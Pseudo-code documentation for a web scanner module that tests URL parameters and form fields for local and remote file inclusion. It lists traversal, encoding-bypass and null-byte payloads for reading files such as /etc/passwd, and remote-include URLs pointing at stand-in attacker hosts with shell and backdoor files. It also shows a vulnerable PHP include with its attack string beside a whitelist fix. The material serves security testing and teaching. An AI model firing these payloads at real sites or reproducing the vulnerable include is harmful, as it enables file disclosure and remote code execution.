# File Inclusion Scanner Module - Pseudo-Code
## File: file_inclusion_scanner.rs

```pseudo
IMPORT libraries:
    - reqwest (HTTP client)
    - tokio (async runtime)
    - indicatif (progress tracking)

IMPORT modules:
    - form (Form structure)


STRUCTURE FileInclusionVulnerability:
    DESCRIPTION: Represents a discovered file inclusion vulnerability

    FIELDS:
        url: URL                    // Vulnerable URL
        parameter: String           // Vulnerable parameter name
        payload: String             // Successful file inclusion payload
        vuln_type: String          // "LFI" (Local) or "RFI" (Remote)


STRUCTURE FileInclusionScanner:
    DESCRIPTION: Scans for Local and Remote File Inclusion vulnerabilities

    FIELDS:
        target_urls: Vector<URL>    // URLs to test
        forms: Vector<Form>         // Forms to test
        payloads: Vector<String>    // File inclusion payloads


FUNCTION FileInclusionScanner::new(target_urls, forms):
    DESCRIPTION: Creates new file inclusion scanner with payloads

    INPUT:
        target_urls: Vector of URLs to scan
        forms: Vector of Forms to scan

    OUTPUT:
        FileInclusionScanner instance

    PROCESS:
        INITIALIZE payloads as empty Vector

        PRINT "Reading payloads from wordlists/file_inclusion..."

        TRY:
            READ directory "wordlists/file_inclusion"

            FOR EACH file IN directory:
                IF file extension is ".txt":
                    OPEN file for reading
                    READ line by line
                    ADD each line to payloads Vector
        CATCH error:
            // Continue with empty payloads
            PASS

        CREATE scanner with target_urls, forms, payloads
        RETURN scanner


FUNCTION FileInclusionScanner::payloads_count():
    DESCRIPTION: Returns the number of payloads loaded

    OUTPUT:
        Number of payloads

    RETURN length of payloads Vector


ASYNC FUNCTION FileInclusionScanner::scan(progress_bar):
    DESCRIPTION: Scans all URLs and forms for file inclusion

    INPUT:
        progress_bar: ProgressBar reference

    OUTPUT:
        Result containing Vector<FileInclusionVulnerability> or Error

    PROCESS:
        CALL scan_urls(progress_bar)
        STORE as url_vulnerabilities

        CALL scan_forms(progress_bar)
        STORE as form_vulnerabilities

        COMBINE url_vulnerabilities and form_vulnerabilities
        RETURN combined list


ASYNC FUNCTION FileInclusionScanner::scan_urls(progress_bar):
    DESCRIPTION: Tests URL parameters for file inclusion

    INPUT:
        progress_bar: ProgressBar reference

    OUTPUT:
        Result containing Vector<FileInclusionVulnerability> or Error

    ALGORITHM:
        INITIALIZE vulnerabilities as empty Vector
        CREATE HTTP client

        FOR EACH url IN target_urls:
            // Skip URLs without parameters
            IF url has no query parameters:
                CONTINUE to next URL

            FOR EACH payload IN payloads:
                EXTRACT query_pairs from url

                // Test each parameter individually
                FOR i FROM 0 TO length(query_pairs) - 1:
                    INITIALIZE new_query_parts as empty Vector
                    INITIALIZE tested_param as empty String

                    // Inject payload into current parameter
                    FOR j FROM 0 TO length(query_pairs) - 1:
                        IF i == j:
                            ADD "{key}={payload}" to new_query_parts
                            SET tested_param = key
                        ELSE:
                            ADD "{key}={value}" to new_query_parts

                    JOIN new_query_parts with "&"
                    CREATE new_url with modified query

                    // Send request
                    TRY:
                        SEND GET request to new_url
                        STORE response

                        // Skip 404 responses
                        IF response.status == 404:
                            CONTINUE to next parameter

                        GET response body as text

                        // Check if vulnerable
                        CALL is_vulnerable(body, payload)
                        IF returns Some(vuln_type):
                            CREATE FileInclusionVulnerability:
                                url = original url
                                parameter = tested_param
                                payload = payload
                                vuln_type = vuln_type
                            ADD to vulnerabilities
                    CATCH error:
                        // Skip on error
                        PASS

                INCREMENT progress_bar by 1
                SLEEP for 50 milliseconds

        RETURN Ok(vulnerabilities)


ASYNC FUNCTION FileInclusionScanner::scan_forms(progress_bar):
    DESCRIPTION: Tests form inputs for file inclusion

    INPUT:
        progress_bar: ProgressBar reference

    OUTPUT:
        Result containing Vector<FileInclusionVulnerability> or Error

    ALGORITHM:
        INITIALIZE vulnerabilities as empty Vector
        CREATE HTTP client

        FOR EACH form IN forms:
            FOR EACH payload IN payloads:
                // Test each form input individually
                FOR i FROM 0 TO length(form.inputs) - 1:
                    INITIALIZE form_data as empty HashMap
                    INITIALIZE tested_param as empty String

                    // Build form data with payload
                    FOR j FROM 0 TO length(form.inputs) - 1:
                        IF i == j:
                            SET form_data[input.name] = payload
                            SET tested_param = input.name
                        ELSE:
                            SET form_data[input.name] = input.value

                    // Construct action URL
                    TRY:
                        RESOLVE form.action against form.url
                        STORE as action_url
                    CATCH error:
                        CONTINUE to next input

                    // Submit form
                    IF form.method is "POST":
                        SEND POST request to action_url with form_data
                    ELSE:
                        SEND GET request to action_url with form_data as query

                    STORE as response

                    // Check response
                    IF response.status != 404:
                        GET response body as text

                        CALL is_vulnerable(body, payload)
                        IF returns Some(vuln_type):
                            CREATE FileInclusionVulnerability:
                                url = form.url
                                parameter = tested_param
                                payload = payload
                                vuln_type = vuln_type
                            ADD to vulnerabilities

                INCREMENT progress_bar by 1
                SLEEP for 50 milliseconds

        RETURN Ok(vulnerabilities)


FUNCTION FileInclusionScanner::is_vulnerable(body, payload):
    DESCRIPTION: Checks if response indicates file inclusion

    INPUT:
        body: HTTP response body as string
        payload: Injected file inclusion payload

    OUTPUT:
        Optional String ("LFI" or "RFI") if vulnerable, None otherwise

    ALGORITHM:
        // Define evidence patterns
        DEFINE lfi_evidence = [
            "root:x:0:0",           // /etc/passwd content
            "[fonts]",              // Windows ini files
            "boot.ini"              // Windows boot file
        ]

        DEFINE rfi_evidence = [
            "<title>Google</title>",  // Remote HTML
            "User-agent: *"           // robots.txt content
        ]

        // Check if payload is a remote URL
        IF payload starts with "http://" OR payload starts with "https://":
            // Check for RFI evidence
            FOR EACH evidence IN rfi_evidence:
                IF body contains evidence:
                    RETURN Some("RFI")
        ELSE:
            // Check for LFI evidence
            FOR EACH evidence IN lfi_evidence:
                IF body contains evidence:
                    RETURN Some("LFI")

        RETURN None
```

## File Inclusion Detection Logic

```pseudo
DETECTION_METHODS:

    1. Local File Inclusion (LFI):
       Payloads: Local file paths
       Examples:
           - ../../../etc/passwd
           - ....//....//....//etc/passwd
           - ..%2F..%2F..%2Fetc%2Fpasswd (URL encoded)
           - /etc/passwd
           - C:\Windows\System32\drivers\etc\hosts

       Evidence in Response:
           - "root:x:0:0" (Linux /etc/passwd)
           - "[fonts]" (Windows ini files)
           - "boot.ini" (Windows boot configuration)

    2. Remote File Inclusion (RFI):
       Payloads: Remote URLs
       Examples:
           - http://attacker.com/shell.txt
           - https://www.google.com/robots.txt
           - http://example.com/malicious.php

       Evidence in Response:
           - "<title>Google</title>" (Remote HTML loaded)
           - "User-agent: *" (robots.txt content)
           - Any content from remote server


PAYLOAD_TYPES:

    LFI Payloads:
        Directory Traversal:
            - ../../../etc/passwd
            - ../../../../../../etc/passwd

        Encoding Bypass:
            - ..%2F..%2Fetc%2Fpasswd (URL encoded)
            - ..%252F..%252Fetc%252Fpasswd (Double encoded)

        Null Byte Injection:
            - ../../../etc/passwd%00
            - ../../../etc/passwd%00.jpg

        Windows Paths:
            - C:\Windows\System32\drivers\etc\hosts
            - ..\..\..\..\Windows\System.ini

        Alternative Traversal:
            - ....//....//etc/passwd
            - ..;/..;/etc/passwd

    RFI Payloads:
        Direct URLs:
            - http://attacker.com/shell.php
            - https://example.com/backdoor.txt

        Test URLs:
            - https://www.google.com/
            - http://example.com/robots.txt


EVIDENCE_DETECTION:

    LFI Evidence Patterns:
        /etc/passwd content:
            "root:x:0:0:root:/root:/bin/bash"

        Windows ini files:
            "[fonts]"
            "[extensions]"
            "[files]"

        Boot configuration:
            "boot.ini"
            "[boot loader]"

    RFI Evidence Patterns:
        Remote HTML:
            "<title>Google</title>"
            "<html>"

        robots.txt:
            "User-agent: *"
            "Disallow:"
```

## Testing Strategy

```pseudo
TESTING_APPROACH:

    For Each URL Parameter:
        1. Replace parameter value with payload
        2. Keep other parameters unchanged
        3. Send HTTP request
        4. Analyze response for evidence
        5. Classify as LFI or RFI if vulnerable

    For Each Form Input:
        1. Set input value to payload
        2. Keep other inputs at default values
        3. Submit form
        4. Analyze response for evidence
        5. Classify as LFI or RFI if vulnerable


VULNERABILITY_CLASSIFICATION:

    Local File Inclusion (LFI):
        Severity: High
        Impact:
            - Read sensitive files (passwords, configs)
            - Source code disclosure
            - Session hijacking
            - Path to RCE with log poisoning

    Remote File Inclusion (RFI):
        Severity: Critical
        Impact:
            - Remote code execution
            - Complete system compromise
            - Data exfiltration
            - Botnet enrollment


RATE_LIMITING:
    Purpose: Polite scanning
    Delay: 50ms between requests
    Throughput: ~20 requests per second
```

## Edge Cases

```pseudo
EDGE_CASES:

    1. Path Normalization:
       - Server may normalize paths
       - Multiple traversal sequences tested

    2. Extension Appending:
       - Server may append .php or .html
       - Null byte injection tested

    3. Encoding Filters:
       - URL encoding tested
       - Double encoding tested

    4. 404 Responses:
       - Skipped to avoid false negatives

    5. Empty Payloads:
       - Handled gracefully

    6. Network Timeouts:
       - RFI may timeout
       - Caught and skipped

    7. Protocol Restrictions:
       - Some servers block http:// in parameters
       - Various protocols tested

    8. False Positives:
       - Evidence patterns carefully selected
       - Multiple patterns reduce false positives
```

## Payload Loading

```pseudo
WORDLIST_STRUCTURE:
    Location: wordlists/file_inclusion/

    Files:
        - lfi_linux.txt (Linux LFI payloads)
        - lfi_windows.txt (Windows LFI payloads)
        - rfi.txt (Remote file inclusion URLs)
        - common.txt (Common file inclusion payloads)

    Loading Process:
        1. Read all .txt files in directory
        2. Load line by line
        3. Store in single payloads vector
        4. Deduplicate if necessary
```

## Example Vulnerable Code

```pseudo
VULNERABLE_PHP_EXAMPLE:

    <?php
        $file = $_GET['page'];
        include($file);
    ?>

    Attack:
        ?page=../../../etc/passwd

    Result:
        Server includes /etc/passwd content in response


SECURE_CODE_EXAMPLE:

    <?php
        $allowed_files = ['home', 'about', 'contact'];
        $file = $_GET['page'];

        if (in_array($file, $allowed_files)) {
            include("pages/" . $file . ".php");
        } else {
            include("pages/error.php");
        }
    ?>

    Defense:
        - Whitelist approach
        - No user input directly in include
        - Fixed base directory
```
